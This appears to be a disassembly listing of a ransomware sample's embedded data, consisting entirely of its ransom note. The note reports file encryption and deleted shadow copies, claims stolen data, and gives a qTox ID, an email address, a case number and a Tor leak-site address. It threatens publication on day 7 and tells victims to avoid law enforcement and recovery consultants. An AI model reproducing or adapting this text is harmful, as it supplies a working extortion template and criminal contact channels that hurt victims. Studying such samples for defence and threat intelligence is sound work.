                                        ; sub_140006810+39D↑o ...
                db 0Dh,0Ah
                db 'We entered. We looked around. We took what was there.',0Dh,0Ah
                db 0Dh,0Ah
                db 'This is the report.',0Dh,0Ah
                db 0Dh,0Ah
                db '-----------------------------------------------------------------'
                db '---------',0Dh,0Ah
                db 0Dh,0Ah
                db 'WHAT WE DID',0Dh,0Ah
                db 0Dh,0Ah
                db 'Files were encrypted where they sat. A unique key per',0Dh,0Ah
                db 'file, wrapped under an offline key that leaves with us',0Dh,0Ah
                db 'when this is over. Backups and shadow copies were',0Dh,0Ah
                db 'removed because they get in the way.',0Dh,0Ah
                db 0Dh,0Ah
                db 'No files were deleted. No data was corrupted. Every',0Dh,0Ah
                db 'byte can be recovered.',0Dh,0Ah
                db 0Dh,0Ah
                db '-----------------------------------------------------------------'
                db '---------',0Dh,0Ah
                db 0Dh,0Ah
                db 'WHAT WE TOOK',0Dh,0Ah
                db 0Dh,0Ah
                db 'A copy of your internal data was extracted during the',0Dh,0Ah
                db 'process. This is not a threat - it is a statement of',0Dh,0Ah
                db 'fact. We have it. You do not.',0Dh,0Ah
                db 0Dh,0Ah
                db 'If an agreement is reached, all copies are destroyed',0Dh,0Ah
                db 'and you receive written confirmation. If no agreement',0Dh,0Ah
                db 'is reached, the data finds new owners.',0Dh,0Ah
                db 0Dh,0Ah
                db '-----------------------------------------------------------------'
                db '---------',0Dh,0Ah
                db 0Dh,0Ah
                db 'NEXT MOVE',0Dh,0Ah
                db 0Dh,0Ah
                db 'Contact us via qTOX: 59DE03AE55C400954D0973FFB90C251A7FDCEB3079A4'
                db '2DF6A6DB93E7D1915F5C47B238A2A99E',0Dh,0Ah
                db 'Contact us via EMAIL: thedoctorcame@protonmail.com',0Dh,0Ah
                db 'Case:    873F5435',0Dh,0Ah
                db 0Dh,0Ah
                db 'Download qTOX: https://qtox.github.io/',0Dh,0Ah
                db 0Dh,0Ah
                db 'Send 2 files. We decrypt them. This is not a',0Dh,0Ah
                db 'negotiation tactic - it is verification that we',0Dh,0Ah
                db 'hold the keys and that recovery is possible.',0Dh,0Ah
                db 'Once you have proof, we talk.',0Dh,0Ah
                db 0Dh,0Ah
                db 'No intermediaries. No recovery consultants. No law',0Dh,0Ah
                db 'enforcement liaison. Every person you add to this',0Dh,0Ah
                db 'conversation is another person who knows what',0Dh,0Ah
                db 'happened here.',0Dh,0Ah
                db 0Dh,0Ah
                db '-----------------------------------------------------------------'
                db '---------',0Dh,0Ah
                db 0Dh,0Ah
                db 'TIMELINE',0Dh,0Ah
                db 0Dh,0Ah
                db 'Day 7 - the full dataset is released. Regulators,',0Dh,0Ah
                db 'clients, and affected parties are notified directly.',0Dh,0Ah
                db 0Dh,0Ah
                db 'Disclosure site (Tor): http://lthicpjqc7gkn5eq3epxndc2uig3yngvcbd'
                db 'ya4u3m3byjod5km4yuwqd.onion/',0Dh,0Ah
                db 0Dh,0Ah
                db '-----------------------------------------------------------------'
                db '---------',0Dh,0Ah
                db 0Dh,0Ah
                db 'This message is your copy. We do not send reminders.',0Dh,0Ah,0
